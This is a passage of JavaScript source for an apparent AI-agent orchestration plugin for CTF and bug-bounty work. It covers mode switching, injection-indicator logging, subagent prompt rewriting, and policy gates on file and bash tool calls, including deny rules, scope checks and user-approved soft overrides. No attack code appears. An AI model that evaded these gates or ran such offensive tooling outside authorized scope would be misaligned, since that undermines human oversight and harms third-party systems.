          store.setAutoLoopEnabled(input.sessionID, true);
          ultraworkEnabled = true;
          safeNoteWrite("ultrawork.enabled", () => {
            notesStore.recordScan("Ultrawork enabled by keyword in user prompt.");
          });
        }
        if (isUserMessage && /\[search-mode\]/i.test(contextText)) {
          searchModeRequestedBySession.add(input.sessionID);
          searchModeGuidancePendingBySession.add(input.sessionID);
          safeNoteWrite("search_mode.enabled", () => {
            notesStore.recordScan(`Search-mode requested: session=${input.sessionID}`);
          });
        }
        if (isUserMessage) {
          const ultrathinkRe = /(^|\n)\s*ultrathink\s*(\n|$)/i;
          const thinkRe = /(^|\n)\s*(think-mode|think\s+mode|think)\s*(\n|$)/i;
          if (ultrathinkRe.test(messageText)) {
            store.setThinkMode(input.sessionID, "ultrathink");
            safeNoteWrite("thinkmode", () => {
              notesStore.recordScan("Think mode set by user keyword: ultrathink.");
            });
          } else if (thinkRe.test(messageText)) {
            store.setThinkMode(input.sessionID, "think");
            safeNoteWrite("thinkmode", () => {
              notesStore.recordScan("Think mode set by user keyword: think.");
            });
          }
        }
        if (config3.enable_injection_logging && notesReady) {
          const indicators = detectInjectionIndicators(contextText);
          if (indicators.length > 0) {
            safeNoteWrite("chat.message.injection", () => {
              notesStore.recordInjectionAttempt("chat.message", indicators, contextText);
            });
            notesStore.flushNow();
          }
        }
        const modeMatch = messageText.match(/\bMODE\s*:\s*(CTF|BOUNTY)\b/i);
        if (modeMatch) {
          store.setMode(input.sessionID, modeMatch[1].toUpperCase());
        } else if (isUserMessage) {
          if (/\bctf\b/i.test(messageText)) {
            store.setMode(input.sessionID, "CTF");
          } else if (/\bbounty\b/i.test(messageText)) {
            store.setMode(input.sessionID, "BOUNTY");
          }
        } else if (config3.enforce_mode_header) {
          const parts = output.parts;
          parts.unshift({
            type: "text",
            text: `MODE: ${state.mode}`
          });
        }
        if (config3.target_detection.enabled) {
          const lockAfterFirst = config3.target_detection.lock_after_first;
          const onlyInScan = config3.target_detection.only_in_scan;
          const canSetTarget = (!onlyInScan || state.phase === "SCAN") && (!lockAfterFirst || state.targetType === "UNKNOWN");
          if (canSetTarget) {
            const target = detectTargetType(contextText);
            if (target) {
              store.setTargetType(input.sessionID, target);
            }
          }
        }
        if (state.mode === "CTF" && (state.targetType === "PWN" || state.targetType === "REV")) {
          const parityRequirement = detectDockerParityRequirement(ctx.directory);
          if (parityRequirement.required) {
            store.setEnvParityRequired(input.sessionID, true, parityRequirement.reason);
          }
        }
        const freeTextSignalsEnabled = config3.allow_free_text_signals || ultraworkEnabled;
        if (freeTextSignalsEnabled) {
          const blockedSignals = [
            "scan_completed",
            "plan_completed",
            "candidate_found",
            "verify_success",
            "verify_fail",
            "submit_accepted",
            "submit_rejected"
          ];
          const blockedDetected = blockedSignals.filter((signal) => new RegExp(`\\b${signal}\\b`, "i").test(messageText));
          if (blockedDetected.length > 0) {
            safeNoteWrite("chat.message.free_text_blocked", () => {
              notesStore.recordScan(`Free-text state transition signals ignored: ${blockedDetected.join(", ")}. Use ctf_orch_event/tool verification path instead.`);
            });
          }
          if (/\bno_new_evidence\b/i.test(messageText)) {
            store.applyEvent(input.sessionID, "no_new_evidence");
          }
          if (/\bsame_payload_(repeat|repeated)\b/i.test(messageText)) {
            store.applyEvent(input.sessionID, "same_payload_repeat");
          }
          if (/\bnew_evidence\b/i.test(messageText)) {
            store.applyEvent(input.sessionID, "new_evidence");
          }
          if (/\breadonly_inconclusive\b/i.test(messageText)) {
            store.applyEvent(input.sessionID, "readonly_inconclusive");
          }
          if (/\breset_loop\b/i.test(messageText)) {
            store.applyEvent(input.sessionID, "reset_loop");
          }
        }
      } catch (error92) {
        noteHookError("chat.message", error92);
      }
    },
    "chat.params": async (input) => {
      try {
        if (typeof input.agent === "string" && input.agent.trim().length > 0) {
          activeAgentBySession.set(input.sessionID, baseAgentName(input.agent.trim()).toLowerCase());
        }
      } catch (error92) {
        noteHookError("chat.params", error92);
      }
    },
    "tool.execute.before": async (input, output) => {
      const hookStartedAt = process.hrtime.bigint();
      try {
        await runClaudeCompatHookOrThrow("PreToolUse", {
          session_id: input.sessionID,
          call_id: input.callID,
          tool_name: input.tool,
          tool_input: isRecord(output.args) ? output.args : {}
        });
        const stateForGate = store.get(input.sessionID);
        const callerAgentFromInput = typeof input.agent === "string" ? baseAgentName((input.agent ?? "").trim()).toLowerCase() : "";
        const callerAgent = callerAgentFromInput || activeAgentBySession.get(input.sessionID) || "";
        const isAegisOrCtfTool = input.tool.startsWith("ctf_") || input.tool.startsWith("aegis_");
        const modeActivationBypassTools = new Set(["ctf_orch_set_mode", "ctf_orch_status"]);
        if (!stateForGate.modeExplicit && isAegisOrCtfTool && !modeActivationBypassTools.has(input.tool)) {
          throw new AegisPolicyDenyError("oh-my-Aegis is inactive until mode is explicitly declared. Use `MODE: CTF`, `MODE: BOUNTY`, or run `ctf_orch_set_mode` first.");
        }
        if (callerAgent === "aegis" && !isAegisManagerDelegationTool(input.tool)) {
          throw new AegisPolicyDenyError(`Aegis manager cannot execute '${input.tool}' directly. Delegate analysis/execution to subagents via task (with explicit subagent_type) and review results via orchestration tools.`);
        }
        if (input.tool === "todowrite") {
          const state2 = store.get(input.sessionID);
          const args = isRecord(output.args) ? output.args : {};
          const todos = Array.isArray(args.todos) ? args.todos : [];
          args.todos = todos;
          if (config3.enforce_todo_single_in_progress) {
            const count = inProgressTodoCount(args);
            if (count > 1) {
              let seen = false;
              for (const todo of todos) {
                if (!isRecord(todo) || todo.status !== "in_progress") {
                  continue;
                }
                if (!seen) {
                  seen = true;
                  continue;
                }
                todo.status = "pending";
              }
              safeNoteWrite("todowrite.guard", () => {
                notesStore.recordScan("Normalized todowrite payload: only one in_progress item is allowed.");
              });
            }
          }
          if (config3.enforce_todo_flow_non_scan && state2.phase !== "SCAN") {
            const terminalCtfSuccess = state2.mode === "CTF" && state2.latestVerified.trim().length > 0;
            const minTodos = Math.max(1, Math.floor(config3.todo_min_items_non_scan));
            let syntheticDedupChanged = false;
            let seenContinue = false;
            for (let i = todos.length - 1;i >= 0; i -= 1) {
              const content = todoContent(todos[i]);
              if (content !== SYNTHETIC_CONTINUE_TODO) {
                continue;
              }
              if (!seenContinue) {
                seenContinue = true;
                continue;
              }
              todos.splice(i, 1);
              syntheticDedupChanged = true;
            }
            if (syntheticDedupChanged) {
              safeNoteWrite("todowrite.flow", () => {
                notesStore.recordScan("Todo flow enforced (non-SCAN): deduplicated repeated synthetic continuation TODO entries.");
              });
            }
            const nonSyntheticCount = todos.filter((todo) => {
              if (!isRecord(todo))
                return false;
              return !isSyntheticTodoContent(todoContent(todo));
            }).length;
            if (!terminalCtfSuccess && todos.length === 0) {
              todos.push({
                content: SYNTHETIC_START_TODO,
                status: "in_progress",
                priority: "high"
              });
            }
            const shouldEnforceGranularity = todos.length === 0 || nonSyntheticCount > 0;
            if (!terminalCtfSuccess && config3.enforce_todo_granularity_non_scan && shouldEnforceGranularity && todos.length < minTodos) {
              const missing = minTodos - todos.length;
              const existingSyntheticBreakdownCount = todos.filter((todo) => todoContent(todo).startsWith(SYNTHETIC_BREAKDOWN_PREFIX)).length;
              for (let i = 0;i < missing; i += 1) {
                todos.push({
                  content: `${SYNTHETIC_BREAKDOWN_PREFIX}${existingSyntheticBreakdownCount + i + 1}.`,
                  status: "pending",
                  priority: "medium"
                });
              }
              safeNoteWrite("todowrite.granularity", () => {
                notesStore.recordScan(`Todo granularity enforced (non-SCAN): expanded todo set to at least ${minTodos} items.`);
              });
            }
            const counts = todoStatusCounts(todos);
            if (!terminalCtfSuccess && counts.pending > 0 && counts.inProgress === 0) {
              for (const todo of todos) {
                if (!isRecord(todo) || todo.status !== "pending") {
                  continue;
                }
                todo.status = "in_progress";
                break;
              }
              safeNoteWrite("todowrite.flow", () => {
                notesStore.recordScan("Todo flow enforced (non-SCAN): promoted next pending item to in_progress after completion update.");
              });
            }
            const finalCounts = todoStatusCounts(todos);
            if (!terminalCtfSuccess && finalCounts.open === 0 && todos.length > 0) {
              let activatedExistingContinue = false;
              for (const todo of todos) {
                if (!isRecord(todo) || todoContent(todo) !== SYNTHETIC_CONTINUE_TODO) {
                  continue;
                }
                todo.status = "in_progress";
                todo.priority = "high";
                activatedExistingContinue = true;
                break;
              }
              if (!activatedExistingContinue && nonSyntheticCount > 0) {
                todos.push({
                  content: SYNTHETIC_CONTINUE_TODO,
                  status: "in_progress",
                  priority: "high"
                });
              }
              if (activatedExistingContinue || nonSyntheticCount > 0) {
                safeNoteWrite("todowrite.flow", () => {
                  notesStore.recordScan("Todo flow enforced (non-SCAN): prevented terminal closure without an active next TODO step.");
                });
              }
            }
          }
          if (state2.ultraworkEnabled && state2.mode === "CTF" && state2.latestVerified.trim().length === 0) {
            const hasOpenTodo = todos.some((todo) => isRecord(todo) && (todo.status === "pending" || todo.status === "in_progress"));
            if (!hasOpenTodo) {
              const decision2 = route(state2, config3);
              todos.push({
                content: `Continue CTF loop via '${decision2.primary}' until submit_accepted (no early stop).`,
                status: "pending",
                priority: "high"
              });
              safeNoteWrite("todowrite.continuation", () => {
                notesStore.recordScan(`Todo continuation enforced (ultrawork): added pending item for route '${decision2.primary}'.`);
              });
            }
          }
          output.args = args;
          return;
        }
        if (input.tool === "read") {
          const args = isRecord(output.args) ? output.args : {};
          const filePath = typeof args.filePath === "string" ? args.filePath : "";
          if (filePath) {
            const rules = getClaudeDenyRules();
            if (rules.denyRead.length > 0) {
              const resolvedTarget = isAbsolute5(filePath) ? resolve7(filePath) : resolve7(ctx.directory, filePath);
              const normalized = normalizePathForMatch(resolvedTarget);
              const denied = rules.denyRead.find((rule) => rule.re.test(normalized));
              if (denied) {
                throw new AegisPolicyDenyError(`Claude settings denied Read: ${denied.raw}`);
              }
            }
            readContextByCallId.set(input.callID, { sessionID: input.sessionID, filePath });
          }
        }
        if (input.tool === "edit" || input.tool === "write") {
          const args = isRecord(output.args) ? output.args : {};
          const pathKeys = ["filePath", "path", "file", "filename"];
          let filePath = "";
          for (const key of pathKeys) {
            const value = args[key];
            if (typeof value === "string" && value.trim().length > 0) {
              filePath = value.trim();
              break;
            }
          }
          if (filePath) {
            const rules = getClaudeDenyRules();
            if (rules.denyEdit.length > 0) {
              const resolvedTarget = isAbsolute5(filePath) ? resolve7(filePath) : resolve7(ctx.directory, filePath);
              const normalized = normalizePathForMatch(resolvedTarget);
              const denied = rules.denyEdit.find((rule) => rule.re.test(normalized));
              if (denied) {
                throw new AegisPolicyDenyError(`Claude settings denied Edit: ${denied.raw}`);
              }
            }
          }
        }
        if (input.tool === "task") {
          const state2 = store.get(input.sessionID);
          const args = output.args ?? {};
          const explicitSubagentProvided = typeof args.subagent_type === "string" && args.subagent_type.trim().length > 0;
          if (callerAgent === "aegis-exec" && !explicitSubagentProvided) {
            throw new AegisPolicyDenyError("Aegis Exec task calls must include explicit subagent_type to avoid recursive self-dispatch.");
          }
          if (!state2.modeExplicit) {
            output.args = args;
            return;
          }
          const SESSION_CONTEXT_MARKER = "[oh-my-Aegis session-context]";
          const SEARCH_MODE_MARKER = "[oh-my-Aegis search-mode]";
          const existingPrompt = typeof args.prompt === "string" ? args.prompt : "";
          const promptWithDefault = existingPrompt.trim().length > 0 ? existingPrompt : "Continue orchestration by following the active mode and phase.";
          if (!promptWithDefault.includes(SESSION_CONTEXT_MARKER)) {
            const sessionContextLines = [
              SESSION_CONTEXT_MARKER,
              `MODE: ${state2.mode}`,
              `PHASE: ${state2.phase}`,
              `TARGET: ${state2.targetType}`
            ];
            if (state2.mode === "BOUNTY") {
              sessionContextLines.push(state2.scopeConfirmed ? "scope_confirmed" : "scope_unconfirmed");
            }
            args.prompt = `${sessionContextLines.join(`
`)}

${promptWithDefault}`;
          } else {
            args.prompt = promptWithDefault;
          }
          const shouldInjectSearchModeGuidance = callerAgent === "aegis" && searchModeRequestedBySession.has(input.sessionID) && searchModeGuidancePendingBySession.has(input.sessionID);
          if (shouldInjectSearchModeGuidance && typeof args.prompt === "string" && !args.prompt.includes(SEARCH_MODE_MARKER)) {
            args.prompt = [
              args.prompt,
              "",
              SEARCH_MODE_MARKER,
              "- Immediately plan delegation-first fan-out.",
              "- Always run ctf_parallel_dispatch plan=scan (local fan-out).",
              "- Always run ctf_subagent_dispatch type=librarian with a focused external-reference query.",
              "- Skip extra explore dispatch only when target is CTF and the parallel scan already includes a ctf-explore track.",
              "- After dispatch, run ctf_parallel_collect message_limit=5 and pick a winner when evidence is clear.",
              "- Do not call read/grep/bash directly from Aegis manager."
            ].join(`
`);
            searchModeGuidancePendingBySession.delete(input.sessionID);
            safeNoteWrite("search_mode.inject", () => {
              notesStore.recordScan(`Search-mode guidance injected: session=${input.sessionID}`);
            });
          }
          const decision2 = route(state2, config3);
          logRouteDecision(input.sessionID, state2, decision2, "task_dispatch");
          const routePinned = isNonOverridableSubagent(decision2.primary);
          const userCategory = typeof args.category === "string" ? args.category : "";
          const userSubagent = typeof args.subagent_type === "string" ? args.subagent_type : "";
          let dispatchModel = "";
          const AUTO_PARALLEL_MARKER = "[oh-my-Aegis auto-parallel]";
          const hasAutoParallelMarker = typeof args.prompt === "string" && args.prompt.includes(AUTO_PARALLEL_MARKER);
          const activeParallelGroup = getActiveGroup(input.sessionID);
          const hasUserTaskOverride = typeof args.subagent_type === "string" && args.subagent_type.trim().length > 0 || typeof args.category === "string" && args.category.trim().length > 0 || typeof args.model === "string" && args.model.trim().length > 0 || typeof args.variant === "string" && args.variant.trim().length > 0;
          const ctfScanRouteSet = new Set(Object.values(config3.routing.ctf.scan).map((name) => baseAgentName(String(name))));
          const bountyScanRouteSet = new Set(Object.values(config3.routing.bounty.scan).map((name) => baseAgentName(String(name))));
          const basePrimary = baseAgentName(decision2.primary);
          const hasPrimaryProfileOverride = Boolean(state2.subagentProfileOverrides[basePrimary]);
          const alternatives = state2.alternatives.map((item) => item.trim()).filter((item) => item.length > 0).slice(0, 3);
          const isCtfParallelScanCandidate = state2.mode === "CTF" && ctfScanRouteSet.has(basePrimary);
          const isBountyParallelScanCandidate = state2.mode === "BOUNTY" && state2.scopeConfirmed && bountyScanRouteSet.has(basePrimary);
          const shouldAutoParallelScan = config3.parallel.auto_dispatch_scan && (isCtfParallelScanCandidate || isBountyParallelScanCandidate) && state2.phase === "SCAN" && !state2.pendingTaskFailover && state2.taskFailoverCount === 0 && !hasUserTaskOverride && !hasPrimaryProfileOverride && !activeParallelGroup && !hasAutoParallelMarker;
          const shouldAutoParallelHypothesis = config3.parallel.auto_dispatch_hypothesis && state2.mode === "CTF" && state2.phase !== "SCAN" && basePrimary === "ctf-hypothesis" && !state2.pendingTaskFailover && !hasUserTaskOverride && alternatives.length >= 2 && !activeParallelGroup && !hasAutoParallelMarker;
          const shouldAutoParallelDeepWorker = state2.mode === "CTF" && (state2.targetType === "REV" || state2.targetType === "PWN") && state2.phase === "EXECUTE" && !state2.pendingTaskFailover && state2.taskFailoverCount === 0 && !hasUserTaskOverride && !hasPrimaryProfileOverride && !activeParallelGroup && !hasAutoParallelMarker;
          const autoParallelForced = shouldAutoParallelScan || shouldAutoParallelHypothesis || shouldAutoParallelDeepWorker;
          if (autoParallelForced) {
            const userPrompt = typeof args.prompt === "string" ? args.prompt.trim() : "";
            const basePrompt = userPrompt.length > 0 ? userPrompt : "Continue CTF orchestration with delegated tracks.";
            if (shouldAutoParallelScan) {
              const autoParallelMode = state2.mode === "BOUNTY" ? "BOUNTY" : "CTF";
              const safetyLine = state2.mode === "BOUNTY" ? "- Keep actions scope-safe and minimal-impact during scan tracks." : "- Do not run direct domain execution before dispatch.";
              args.prompt = [
                basePrompt,
                "",
                AUTO_PARALLEL_MARKER,
                `mode=${autoParallelMode} phase=SCAN`,
                "- Immediately run ctf_parallel_dispatch plan=scan with challenge_description derived from available context.",
                safetyLine,
                "- While tracks run, check ctf_parallel_status and then merge with ctf_parallel_collect.",
                "- Choose winner when clear, then update plan + TODO list (multiple todos allowed, one in_progress)."
              ].join(`
`);
            } else if (shouldAutoParallelHypothesis) {
              const hypothesesPayload = JSON.stringify(alternatives.map((hypothesis) => ({
                hypothesis,
                disconfirmTest: "Run one cheapest disconfirm test and return verifier-aligned evidence."
              })));
              args.prompt = [
                basePrompt,
                "",
                AUTO_PARALLEL_MARKER,
                "mode=CTF phase=PLAN_OR_EXECUTE",
                "- Immediately run ctf_parallel_dispatch plan=hypothesis with the provided hypotheses JSON.",
                `- hypotheses=${hypothesesPayload}`,
                "- While tracks run, check ctf_parallel_status and then merge with ctf_parallel_collect.",
                "- Declare winner if clear, then update plan + TODO list (multiple todos allowed, one in_progress)."
              ].join(`
`);
            } else {
              const goal = typeof args.prompt === "string" && args.prompt.trim().length > 0 ? args.prompt.trim().slice(0, 2000) : `Deep parallel analysis for ${state2.targetType} in EXECUTE phase.`;
              args.prompt = [
                basePrompt,
                "",
                AUTO_PARALLEL_MARKER,
                "mode=CTF phase=EXECUTE",
                `- Immediately run ctf_parallel_dispatch plan=deep_worker goal=${JSON.stringify(goal)}.`,
                "- Launch static and dynamic tracks in parallel and collect with ctf_parallel_collect.",
                "- Pick winner when clear, then update TODO list and proceed with one in_progress item."
              ].join(`
`);
            }
            args.subagent_type = "aegis-deep";
            if ("category" in args) {
              delete args.category;
            }
            store.setLastTaskCategory(input.sessionID, "aegis-deep");
            store.setLastDispatch(input.sessionID, decision2.primary, "aegis-deep");
            safeNoteWrite("task.auto_parallel", () => {
              notesStore.recordScan(`Auto parallel dispatch armed: session=${input.sessionID} scan=${shouldAutoParallelScan} hypothesis=${shouldAutoParallelHypothesis} deep_worker=${shouldAutoParallelDeepWorker}`);
            });
          }
          if (config3.auto_dispatch.enabled && !autoParallelForced) {
            const dispatch = decideAutoDispatch(decision2.primary, state2, config3.auto_dispatch.max_failover_retries, config3);
            dispatchModel = typeof dispatch.model === "string" ? dispatch.model.trim() : "";
            const hasUserCategory = typeof args.category === "string" && args.category.length > 0;
            const hasUserSubagent = typeof args.subagent_type === "string" && args.subagent_type.length > 0;
            const shouldForceFailover = state2.pendingTaskFailover;
            const hasUserDispatch = hasUserCategory || hasUserSubagent;
            const shouldSetSubagent = Boolean(dispatch.subagent_type) && (routePinned || shouldForceFailover || !config3.auto_dispatch.preserve_user_category || !hasUserDispatch);
            if (dispatch.subagent_type && shouldSetSubagent) {
              const forced = routePinned ? decision2.primary : dispatch.subagent_type;
              if (routePinned && (userCategory || userSubagent) && (userSubagent !== forced || userCategory)) {
                safeNoteWrite("task.pin", () => {
                  notesStore.recordScan(`policy-pin task: route=${decision2.primary} mode=${state2.mode} scopeConfirmed=${state2.scopeConfirmed} user_category=${userCategory || "(none)"} user_subagent=${userSubagent || "(none)"}`);
                });
              }
              args.subagent_type = forced;
              if ("category" in args) {
                delete args.category;
              }
              store.setLastTaskCategory(input.sessionID, forced);
              store.setLastDispatch(input.sessionID, decision2.primary, forced);
              if (shouldForceFailover) {
                store.consumeTaskFailover(input.sessionID);
              }
            }
            const requestedAgent = typeof args.subagent_type === "string" && args.subagent_type.length > 0 ? args.subagent_type : typeof args.category === "string" && args.category.length > 0 ? args.category : "";
            if (requestedAgent) {
              store.setLastTaskCategory(input.sessionID, requestedAgent);
              store.setLastDispatch(input.sessionID, decision2.primary, requestedAgent);
            }
            if (typeof args.prompt === "string") {
              const tail = `

[oh-my-Aegis auto-dispatch] ${dispatch.reason}`;
              if (!args.prompt.includes("[oh-my-Aegis auto-dispatch]")) {
                args.prompt = `${args.prompt}${tail}`;
              }
            }
          }
          if (!config3.auto_dispatch.enabled && routePinned) {
            if ((userCategory || userSubagent) && (userSubagent !== decision2.primary || userCategory)) {
              safeNoteWrite("task.pin", () => {
                notesStore.recordScan(`policy-pin task: route=${decision2.primary} mode=${state2.mode} scopeConfirmed=${state2.scopeConfirmed} user_category=${userCategory || "(none)"} user_subagent=${userSubagent || "(none)"}`);
              });
            }
            args.subagent_type = decision2.primary;
            if ("category" in args) {
              delete args.category;
            }
            store.setLastTaskCategory(input.sessionID, decision2.primary);
            store.setLastDispatch(input.sessionID, decision2.primary, decision2.primary);
          }
          if (typeof args.prompt === "string" && !hasPlaybookMarker(args.prompt)) {
            args.prompt = `${args.prompt}

${buildTaskPlaybook(state2, config3)}`;
          }
          const categoryRequested = typeof args.category === "string" ? args.category.trim() : "";
          const subagentRequested = typeof args.subagent_type === "string" ? args.subagent_type.trim() : "";
          if (!subagentRequested && categoryRequested) {
            args.subagent_type = categoryRequested;
            if ("category" in args) {
              delete args.category;
            }
          }
          const THINKING_MODEL_ID = "openai/gpt-5.2";
          const rawRequested = typeof args.subagent_type === "string" ? args.subagent_type.trim() : "";
          const requested = baseAgentName(rawRequested);
          if (requested && rawRequested !== requested) {
            args.subagent_type = requested;
          }
          const thinkMode = state2.thinkMode;
          const MAX_AUTO_DEEPEN_PER_SESSION = 3;
          const autoDeepenCount = state2.recentEvents.filter((e) => e === "auto_deepen_applied").length;
          const shouldAutoDeepen = state2.mode === "CTF" && isStuck(state2, config3) && autoDeepenCount < MAX_AUTO_DEEPEN_PER_SESSION;
          const shouldUltrathink = thinkMode === "ultrathink";
          const shouldThink = thinkMode === "think" && (state2.phase === "PLAN" || decision2.primary === "ctf-hypothesis" || decision2.primary === "deep-plan");
          const userPreferredModel = typeof args.model === "string" ? args.model.trim() : "";
          const userPreferredVariant = typeof args.variant === "string" ? args.variant.trim() : "";
          let preferredModel = dispatchModel;
          let preferredVariant = "";
          let thinkProfileApplied = false;
          if (requested && (shouldUltrathink || shouldThink || shouldAutoDeepen)) {
            if (!isNonOverridableSubagent(requested) && isModelHealthy(state2, THINKING_MODEL_ID, config3.dynamic_model.health_cooldown_ms)) {
              preferredModel = THINKING_MODEL_ID;
              preferredVariant = "xhigh";
              thinkProfileApplied = true;
              if (shouldAutoDeepen) {
                state2.recentEvents.push("auto_deepen_applied");
                if (state2.recentEvents.length > 30) {
                  state2.recentEvents = state2.recentEvents.slice(-30);
                }
              }
              safeNoteWrite("thinkmode.apply", () => {
                notesStore.recordScan(`Think mode profile applied: subagent=${requested}, model=${THINKING_MODEL_ID}, variant=${preferredVariant} (mode=${thinkMode} stuck=${shouldAutoDeepen} deepenCount=${autoDeepenCount})`);
              });
            } else {
              safeNoteWrite("thinkmode.skip", () => {
                notesStore.recordScan(`Think mode skipped: pro model unhealthy or non-overridable. Keeping '${requested}'. (mode=${thinkMode} stuck=${shouldAutoDeepen})`);
              });
            }
          }
          if (requested) {
            const profileMap = state2.subagentProfileOverrides;
            const overrideProfile = (isRecord(profileMap[requested]) ? profileMap[requested] : null) ?? (isRecord(profileMap[rawRequested]) ? profileMap[rawRequested] : null);
            if (overrideProfile) {
              const overrideModel = typeof overrideProfile.model === "string" ? overrideProfile.model.trim() : "";
              const overrideVariant = typeof overrideProfile.variant === "string" ? overrideProfile.variant.trim() : "";
              if (overrideModel) {
                preferredModel = overrideModel;
              }
              if (overrideVariant) {
                preferredVariant = overrideVariant;
              }
              if (overrideModel || overrideVariant) {
                safeNoteWrite("subagent.profile.override", () => {
                  notesStore.recordScan(`Subagent profile override applied: subagent=${requested}, model=${overrideModel || "(unchanged)"}, variant=${overrideVariant || "(unchanged)"}`);
                });
              }
            }
            if (userPreferredModel) {
              preferredModel = userPreferredModel;
            }
            if (userPreferredVariant) {
              preferredVariant = userPreferredVariant;
            }
            const resolvedProfile = resolveAgentExecutionProfile(rawRequested || requested, {
              preferredModel,
              preferredVariant
            });
            args.subagent_type = resolvedProfile.baseAgent;
            args.model = resolvedProfile.model;
            if (resolvedProfile.variant) {
              args.variant = resolvedProfile.variant;
            } else if ("variant" in args) {
              delete args.variant;
            }
            store.setLastTaskCategory(input.sessionID, resolvedProfile.baseAgent);
            store.setLastDispatch(input.sessionID, decision2.primary, resolvedProfile.baseAgent, resolvedProfile.model, resolvedProfile.variant);
            if (thinkProfileApplied) {
              safeNoteWrite("thinkmode.resolved", () => {
                notesStore.recordScan(`Think mode resolved profile: subagent=${resolvedProfile.baseAgent}, model=${resolvedProfile.model}, variant=${resolvedProfile.variant}`);
              });
            }
          }
          const finalSubagent = typeof args.subagent_type === "string" ? baseAgentName(args.subagent_type.trim()) : "";
          const verificationRoutes = new Set(["ctf-verify", "ctf-decoy-check"]);
          const envParityRequiredTargets = new Set(["PWN", "REV"]);
          if (state2.mode === "CTF" && verificationRoutes.has(finalSubagent)) {
            if (state2.phase !== "VERIFY") {
              throw new AegisPolicyDenyError("Verification route is blocked until candidate review reaches VERIFY phase. Move through SCAN -> PLAN -> EXECUTE -> VERIFY first.");
            }
            if (!state2.candidatePendingVerification || state2.latestCandidate.trim().length === 0) {
              throw new AegisPolicyDenyError("Verification route is blocked because no active candidate is pending verification.");
            }
            if (envParityRequiredTargets.has(state2.targetType)) {
              if (!state2.envParityChecked) {
                throw new AegisPolicyDenyError("PWN/REV verification route is blocked until env parity baseline is checked. Run `ctf_env_parity` first.");
              }
              if (!state2.envParityAllMatch) {
                throw new AegisPolicyDenyError("PWN/REV verification route is blocked because env parity mismatch was detected. Re-align environment before verification.");
              }
            }
          }
          if (state2.mode === "CTF" && finalSubagent === "ctf-verify" && state2.latestCandidate.trim().length > 0 && isLowConfidenceCandidate(state2.latestCandidate)) {
            throw new AegisPolicyDenyError("Direct ctf-verify is blocked for low-confidence or decoy-like candidate. Run ctf-decoy-check and gather stronger evidence first.");
          }
          if (thinkMode !== "none") {
            store.setThinkMode(input.sessionID, "none");
          }
          if (config3.skill_autoload.enabled) {
            const subagentType = typeof args.subagent_type === "string" ? args.subagent_type : decision2.primary;
            const autoload = resolveAutoloadSkills({
              state: state2,
              config: config3,
              subagentType,
              availableSkills
            });
            const merged = mergeLoadSkills({
              existing: args.load_skills,
              autoload,
              maxSkills: config3.skill_autoload.max_skills,
              availableSkills
            });
            if (merged.length > 0) {
              args.load_skills = merged;
            }
          }
          output.args = args;
          return;
        }
        if (input.tool !== "bash") {
          return;
        }
        const state = store.get(input.sessionID);
        const command = extractBashCommand(output.args);
        if (config3.recovery.enabled && config3.recovery.non_interactive_env) {
          const interactive = detectInteractiveCommand(command);
          if (interactive) {
            safeNoteWrite("non-interactive-env", () => {
              notesStore.recordScan(`Non-interactive guard blocked: id=${interactive.id} command=${command.slice(0, 120)}`);
            });
            throw new AegisPolicyDenyError(`[oh-my-Aegis non-interactive-env] ${interactive.reason}. Rewrite the command to be non-interactive.`);
          }
        }
        const claudeRules = getClaudeDenyRules();
        if (claudeRules.denyBash.length > 0) {
          const denied = claudeRules.denyBash.find((rule) => rule.re.test(sanitizeCommand(command)));
          if (denied) {
            throw new AegisPolicyDenyError(`Claude settings denied Bash: ${denied.raw}`);
          }
        }
        const scopePolicy = state.mode === "BOUNTY" ? getBountyScopePolicy() : null;
        const decision = evaluateBashCommand(command, config3, state.mode, {
          scopeConfirmed: state.scopeConfirmed,
          scopePolicy,
          now: new Date
        });
        if (!decision.allow) {
          const denyLevel = decision.denyLevel ?? "hard";
          if (denyLevel === "soft") {
            pruneSoftBashOverrides();
            const override = softBashOverrideByCallId.get(input.callID);
            if (override) {
              softBashOverrideByCallId.delete(input.callID);
              safeNoteWrite("bash.override", () => {
                notesStore.recordScan(`policy-override bash: reason=${override.reason || "(none)"} command=${override.command || "(empty)"}`);
              });
              return;
            }
          }
          throw new AegisPolicyDenyError(decision.reason ?? "Command blocked by Aegis policy.");
        }
      } catch (error92) {
        if (error92 instanceof AegisPolicyDenyError) {
          throw error92;
        }
        noteHookError("tool.execute.before", error92);
      } finally {
        maybeRecordHookLatency("tool.execute.before", input, hookStartedAt);
      }
    },
    "permission.ask": async (input, output) => {
      try {
        const state = store.get(input.sessionID);
        if (input.type.toLowerCase() !== "bash") {
          return;
        }
        const command = extractBashCommand(input.metadata);
        const scopePolicy = state.mode === "BOUNTY" ? getBountyScopePolicy() : null;
        const decision = evaluateBashCommand(command, config3, state.mode, {
          scopeConfirmed: state.scopeConfirmed,
          scopePolicy,
          now: new Date
        });
        output.status = "ask";
        if (!decision.allow) {
          pruneSoftBashOverrides();
          const denyLevel = decision.denyLevel ?? "hard";
          if (denyLevel === "soft") {
            if (input.callID) {
              softBashOverrideByCallId.set(input.callID, {
                addedAt: Date.now(),
                reason: decision.reason ?? "",
                command: decision.sanitizedCommand ?? command
              });
              output.status = "ask";
            } else {
              output.status = "deny";
            }
          } else {
            output.status = "deny";
          }
        }
      } catch (error92) {
        noteHookError("permission.ask", error92);
      }
    },
    "tool.execute.after": async (input, output) => {
      const hookStartedAt = process.hrtime.bigint();
      try {
        await runClaudeCompatHookBestEffort("PostToolUse", {
          session_id: input.sessionID,
          call_id: input.callID,
          tool_name: input.tool,
          tool_title: output.title
        });
        const originalTitle = output.title;
        const originalOutput = output.output;
        const raw = `${originalTitle}
${originalOutput}`;
        const metricSignals = [];
        const metricExtras = {};
        {
          const isAegisTool = input.tool.startsWith("ctf_") || input.tool.startsWith("aegis_");
          const curState = store.get(input.sessionID);
          const history = [...curState.toolCallHistory, input.tool].slice(-20);
          store.update(input.sessionID, {
            toolCallCount: curState.toolCallCount + 1,
            aegisToolCallCount: curState.aegisToolCallCount + (isAegisTool ? 1 : 0),
            lastToolCallAt: Date.now(),
            toolCallHistory: history
          });
        }
        if (input.tool === "ctf_parallel_dispatch") {
          let dispatchOk = false;
          if (typeof originalOutput === "string" && originalOutput.trim().length > 0) {
            try {
              const parsed = JSON.parse(originalOutput);
              dispatchOk = parsed.ok === true;
            } catch {
              dispatchOk = /"ok"\s*:\s*true/.test(originalOutput);
            }
          }
          if (dispatchOk) {
            searchModeRequestedBySession.delete(input.sessionID);
            searchModeGuidancePendingBySession.delete(input.sessionID);
            safeNoteWrite("search_mode.clear", () => {
              notesStore.recordScan(`Search-mode cleared after successful parallel dispatch: session=${input.sessionID}`);
            });
